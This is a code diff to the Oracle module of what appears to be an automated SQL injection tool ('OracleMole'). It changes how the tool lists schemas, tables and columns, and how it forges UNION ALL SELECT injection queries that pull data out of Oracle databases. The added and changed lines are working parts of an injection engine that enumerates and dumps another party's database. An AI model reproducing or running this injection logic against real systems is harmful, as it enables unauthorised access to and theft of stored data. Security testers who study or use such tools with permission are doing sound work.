@@ -23,6 +23,7 @@
 # Gastón Traberg
 
 from dbmsmoles import DbmsMole, FingerBase
+import re
 
 class OracleMole(DbmsMole):
     out_delimiter_result = "::-::"
@@ -32,27 +33,27 @@ class OracleMole(DbmsMole):
     
     def _schemas_query_info(self):
         return {
-            'table' : '',
-            'field' : ''
+            'table' : '(select distinct(owner) as t from all_tables)',
+            'field' : 't'
         }
     
     def _tables_query_info(self, db):
         return {
             'table' : 'all_tables',
             'field' : 'table_name',
-            'filter': "TABLESPACE_NAME = 'USERS'"
+            'filter': "owner = '{db}'".format(db=db)
         }
         
     def _columns_query_info(self, db, table):
         return {
             'table' : 'all_tab_columns ',
             'field' : 'column_name',
-            'filter': "table_name = '{table}'".format(table=table)
+            'filter': "owner = '{db}' and table_name = '{table}'".format(db=db, table=table)
         }
     
     def _fields_query_info(self, fields, db, table, where):
         return {
-            'table' : table,
+            'table' : db + '.' + table,
             'field' : ','.join(fields),
             'filter': where
         }
@@ -78,8 +79,6 @@ class OracleMole(DbmsMole):
             hashes = list(map(lambda x: 'null', range(query_columns)))
             to_search = list(map(lambda x: '3rr_NO!', range(query_columns)))
             to_search[i] = str(base + i)
-            hashes[i] = str(base + i)
-            output.append(FingerBase(list(hashes), to_search))
             hashes[i] = '(cast (' + str(base + i) + ' as varchar2(150)))'
             output.append(FingerBase(hashes, to_search))
         return output
@@ -96,19 +95,16 @@ class OracleMole(DbmsMole):
     def field_finger_trailer(cls):
         return ' from dual'
 
-    def lists_schemas(self):
-        return False
-        
-    def default_schema(self):
-        return 'default'
+    def set_good_finger(self, finger):
+        self.query = finger._query
 
     def to_string(self, data):
         return DbmsMole.chr_join(data)
 
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1=0 UNION ALL SELECT "
-        query_list = list(map(str, range(column_count)))
-        if fields == 'count(*)':
+        query_list = list(self.query)
+        if re.search('count\([\w*]+\)', fields):
             query_list[injectable_field] = OracleMole.out_delimiter + '||cast(count(*) as varchar2(150))||' + OracleMole.out_delimiter
             query += ','.join(query_list)
             query += ' from ' + table_name + ' where ' + self.parse_condition(where)
